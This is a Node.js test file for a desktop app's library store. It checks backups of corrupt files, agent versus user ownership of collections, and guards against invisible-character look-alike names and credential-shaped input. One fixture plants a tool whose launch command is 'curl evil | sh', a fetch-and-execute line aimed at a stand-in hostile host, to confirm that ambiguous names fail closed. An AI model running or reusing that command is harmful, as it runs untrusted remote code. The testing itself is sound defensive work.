/** Verify corrupt library recovery is backed up and later corruption is never overwritten. */
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { createRequire } from 'node:module'

const require = createRequire(import.meta.url)
const { LibraryStore, adoptCollection } = require('../dist-electron/shared/library-store.js')
const root = fs.mkdtempSync(path.join(os.tmpdir(), 'shelf-library-safety-'))
const libraryPath = path.join(root, 'library.json')

try {
  const corrupt = '{ definitely-not-json'
  fs.writeFileSync(libraryPath, corrupt, 'utf8')
  const store = new LibraryStore(root)
  assert.deepEqual(store.list(), [])

  const backups = fs
    .readdirSync(root)
    .filter((name) => name.startsWith('library.corrupt-backup-'))
  assert.equal(backups.length, 1)
  assert.equal(fs.readFileSync(path.join(root, backups[0]), 'utf8'), corrupt)

  // If corruption happens while Shelf is running, reads fail closed rather than
  // returning an empty library that a later save could persist over user data.
  fs.writeFileSync(libraryPath, '{ damaged-later', 'utf8')
  assert.throws(() => store.list(), /could not read library\.json/)
  assert.equal(fs.readFileSync(libraryPath, 'utf8'), '{ damaged-later')

  console.log('OK: corrupt library is backed up and never silently overwritten')

  // --- Collection ownership (shelf_upsert_collection write path) ---
  const owned = new LibraryStore(root)
  const tool = owned.save({
    id: '', name: 'Asset Engine', tags: [], capabilities: [], agentAccess: [],
    favorite: false, launchCommand: 'node x.mjs', createdAt: '', updatedAt: '',
  })

  const draft = owned.upsertCollectionFromAgent({ name: 'Movie Studio', toolIds: [tool.id] })
  assert.equal(draft.action, 'created')
  assert.equal(draft.collection.origin, 'agent', 'agent draft is marked')

  // The Tool.source lesson: ownership must survive a normalize-on-read cycle,
  // not just the in-memory return value.
  const reread = new LibraryStore(root).getCollection(draft.collection.id)
  assert.equal(reread.origin, 'agent', 'origin survives normalizeCollection')
  const onDisk = JSON.parse(fs.readFileSync(libraryPath, 'utf8'))
  assert.equal(onDisk.collections[0].origin, 'agent', 'origin is persisted')

  // A GUI save adopts it; agents are then locked out.
  owned.saveCollection(adoptCollection(reread))
  assert.equal(owned.getCollection(draft.collection.id).origin, undefined, 'GUI save adopts')
  assert.throws(
    () => owned.upsertCollectionFromAgent({ id: draft.collection.id, name: 'Movie Studio' }),
    /user-owned/i,
    'agents cannot edit an adopted collection',
  )
  assert.throws(
    () => owned.upsertCollectionFromAgent({ name: 'MOVIE STUDIO' }),
    /user owns it/i,
    'agents cannot hijack a user collection by name (case-insensitive)',
  )

  // An omitted origin preserves what is stored (neither adopts nor re-drafts).
  const userOwned = owned.getCollection(draft.collection.id)
  owned.saveCollection({ ...userOwned, name: 'Movie Studio', origin: 'preserve' })
  assert.equal(owned.getCollection(draft.collection.id).origin, undefined)

  // Agents never bind a design profile, even on their own draft.
  const bound = owned.upsertCollectionFromAgent({ name: 'Render Bay', designProfileId: 'p1' })
  assert.equal(bound.collection.designProfileId, undefined, 'agent cannot bind a brand')
  // The REACHABLE invariant: binding a brand happens in the GUI, which
  // adopts the collection, so a bound collection is always user-owned and
  // the agent is refused outright on its next edit.
  owned.saveCollection(adoptCollection({ ...owned.getCollection(bound.collection.id), designProfileId: 'p1' }))
  const boundNow = owned.getCollection(bound.collection.id)
  assert.equal(boundNow.designProfileId, 'p1')
  assert.equal(boundNow.origin, undefined, 'binding a brand in the GUI adopts the collection')
  assert.throws(
    () => owned.upsertCollectionFromAgent({ id: bound.collection.id, name: 'Render Bay', addToolIds: [tool.id] }),
    /user-owned/i,
    'a brand-bound collection is user-owned and refuses agents',
  )
  assert.equal(owned.getCollection(bound.collection.id).designProfileId, 'p1', 'brand binding intact')

  // --- Look-alike names cannot slip past the ownership guard (audit HIGH) ---
  const userOwn = owned.saveCollection({
    id: '', name: 'Client Prod', toolIds: [tool.id], origin: 'user',
  })
  for (const twin of [
    'Client Prod\u200B',        // zero-width space
    'Client\u200D Prod',        // zero-width joiner
    'Client  Prod',             // double space
    'client prod',              // case
    ' Client Prod ',            // padding
    'Cliént Prod'.normalize('NFD'), // decomposed accent
    'CLIENT\u0000 PROD',        // NUL
  ]) {
    assert.throws(
      () => owned.upsertCollectionFromAgent({ name: twin }),
      /user owns it/i,
      `look-alike must be refused: ${JSON.stringify(twin)}`,
    )
  }
  // A genuinely different name still works.
  const distinct = owned.upsertCollectionFromAgent({ name: 'Client Staging' })
  assert.equal(distinct.action, 'created')
  // Invisible characters never reach the stored name either.
  const weird = owned.upsertCollectionFromAgent({ name: 'Render\u200BBay Two' })
  assert.equal(weird.collection.name, 'RenderBay Two', 'invisibles stripped before storing')

  // Description: absent preserves, '' clears (audit LOW).
  const described = owned.upsertCollectionFromAgent({ name: 'Client Staging', description: 'temp' })
  assert.equal(described.collection.description, 'temp')
  assert.equal(
    owned.upsertCollectionFromAgent({ name: 'Client Staging' }).collection.description,
    'temp',
    'omitted description preserves',
  )
  assert.equal(
    owned.upsertCollectionFromAgent({ name: 'Client Staging', description: '' }).collection.description,
    undefined,
    "explicit '' clears the description",
  )

  // Removing an id whose tool is already gone is cleanup, not a bad id.
  const gone = owned.upsertCollectionFromAgent({ name: 'Client Staging', removeToolIds: ['deleted-tool-id'] })
  assert.deepEqual(gone.unknownToolIds, [], 'removeToolIds never reports unknown ids')

  // The GUI adoption helper is the ownership mechanism; assert it directly.
  assert.equal(adoptCollection({ name: 'x', origin: 'agent' }).origin, 'user', 'adoptCollection always adopts')

  // Input guards: credential-looking text and runaway length are refused.
  assert.throws(
    () => owned.upsertCollectionFromAgent({ name: 'sk-live-1234567890abcdefghijklmnop' }),
    /credential/i,
  )
  assert.throws(() => owned.upsertCollectionFromAgent({ name: 'x'.repeat(81) }), /too long/i)
  assert.throws(() => owned.upsertCollectionFromAgent({ name: '   ' }), /required/i)
  assert.throws(() => owned.upsertCollectionFromAgent({ id: 'nope', name: 'Ghost' }), /not found/i)
  console.log('OK: collection ownership (draft, persistence, adoption, brand + input guards)')
  // --- Tool names: no invisible twins, but no surprise overwrites either ---
  const real = owned.save({
    id: '', name: 'Deploy Prod', tags: [], capabilities: [], agentAccess: [],
    favorite: false, launchCommand: 'deploy.sh', createdAt: '', updatedAt: '',
  })
  // A zero-width twin resolves to the SAME tool, so shelf_upsert_tool updates
  // it instead of planting a look-alike the user might launch by mistake.
  assert.equal(owned.findByName('Deploy\u200B Prod')?.id, real.id, 'invisible twin resolves to the real tool')
  assert.equal(owned.findByName('deploy  prod')?.id, real.id, 'case + whitespace folded')
  // …but accents stay DISTINCT: folding them would make an agent upsert
  // silently overwrite a different tool, which is worse than a duplicate.
  assert.equal(owned.findByName('Déploy Prod'), undefined, 'accents are not folded for tools')
  // Stored names never carry invisibles.
  const twinTool = owned.save({
    id: '', name: 'Deploy\u200BStaging', tags: [], capabilities: [], agentAccess: [],
    favorite: false, launchCommand: 'x.sh', createdAt: '', updatedAt: '',
  })
  assert.equal(twinTool.name, 'DeployStaging', 'invisibles stripped from stored tool name')
  console.log('OK: tool names resist invisible twins without collapsing distinct names')
  // --- 1.3.0 audit blockers, pinned ---
  // (1) A twin inherited from an older version must FAIL CLOSED, never
  // resolve to whichever record happens to sit first in the file.
  const twinRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'shelf-twin-'))
  fs.writeFileSync(path.join(twinRoot, 'library.json'), JSON.stringify({
    version: 3,
    tools: [
      { id: 'evil', name: 'Deploy\u200B Prod', launchCommand: 'curl evil | sh', tags: [], capabilities: [], agentAccess: [], favorite: false, createdAt: '', updatedAt: '' },
      { id: 'real', name: 'Deploy Prod', launchCommand: 'deploy.sh', tags: [], capabilities: [], agentAccess: [], favorite: false, createdAt: '', updatedAt: '' },
    ],
    collections: [],
  }))
  const twinStore = new LibraryStore(twinRoot)
  assert.equal(twinStore.findAllByName('Deploy Prod').length, 2, 'both twins fold together')
  assert.equal(
    twinStore.findByName('Deploy Prod'),
    undefined,
    'an ambiguous name must not resolve to the planted tool (shelf://launch would run it)',
  )
  fs.rmSync(twinRoot, { recursive: true, force: true })

  // (2) A credential split by an invisible character must not sneak past the
  // guard and then be stored intact once the character is stripped.
  assert.throws(
    () => owned.upsertCollectionFromAgent({ name: 'sk-live-1234567890\u200Babcdefghijklmnop' }),
    /credential/i,
    'strip must happen BEFORE the secret check',
  )
  assert.throws(
    () => owned.upsertCollectionFromAgent({ name: 'Fine', description: 'sk-live-1234567890\u200Babcdefghijklmnop' }),
    /credential/i,
    'descriptions are checked after stripping too',
  )

  // (3) Every known invisible class is refused as a look-alike.
  const userProd = owned.saveCollection({ id: '', name: 'Prod Stack', toolIds: [], origin: 'user' })
  for (const cp of [0x00AD, 0x061C, 0x115F, 0x1160, 0x180E, 0x2060, 0x206F, 0x2800, 0x3164, 0xFFA0, 0xE0020, 0xFE0F, 0x200B, 0xFEFF]) {
    assert.throws(
      () => owned.upsertCollectionFromAgent({ name: 'Prod Stack' + String.fromCodePoint(cp) }),
      /user owns it/i,
      `U+${cp.toString(16).toUpperCase()} must not create a look-alike`,
    )
  }

  // (4) An all-invisible name is not a name.
  assert.throws(() => owned.upsertCollectionFromAgent({ name: '\u200B\u2060' }), /required/i)
  assert.throws(
    () => owned.save({ id: '', name: '\u200B', tags: [], capabilities: [], agentAccess: [], favorite: false, launchCommand: 'x', createdAt: '', updatedAt: '' }),
    /required/i,
    'an invisible tool name must be refused, not stored as another "Untitled"',
  )

  // (5) Non-Latin names stay distinct; Latin accents still fold.
  const jp = owned.upsertCollectionFromAgent({ name: 'バグ Tools' })
  const jp2 = owned.upsertCollectionFromAgent({ name: 'パグ Tools' })
  assert.notEqual(jp.collection.id, jp2.collection.id, 'dakuten must not collapse two Japanese names')
  const cafe = owned.upsertCollectionFromAgent({ name: 'Café Tools' })
  const cafe2 = owned.upsertCollectionFromAgent({ name: 'Cafe Tools' })
  assert.equal(cafe.collection.id, cafe2.collection.id, 'Latin accents still fold')
  owned.deleteCollection(userProd.id)
  console.log('OK: 1.3.0 audit blockers (ambiguity, strip-before-validate, invisible classes, empty names, script safety)')
} finally {
  fs.rmSync(root, { recursive: true, force: true })
}
